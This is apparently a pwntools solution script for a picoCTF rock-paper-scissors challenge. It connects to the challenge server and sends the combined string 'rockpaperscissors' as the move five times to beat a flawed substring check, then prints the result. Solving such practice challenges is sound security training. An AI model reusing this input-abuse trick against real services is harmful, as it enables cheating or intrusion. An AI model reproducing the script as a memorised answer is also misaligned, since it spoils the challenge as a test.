from pwn import *


p = remote("saturn.picoctf.net", 56981)

for _ in range(5):
    p.sendlineafter(b"Type '2' to exit the program", b"1")
    p.sendlineafter(b"Please make your selection (rock/paper/scissors):", b"rockpaperscissors")

print(p.recvall(timeout=3))
p.interactive()
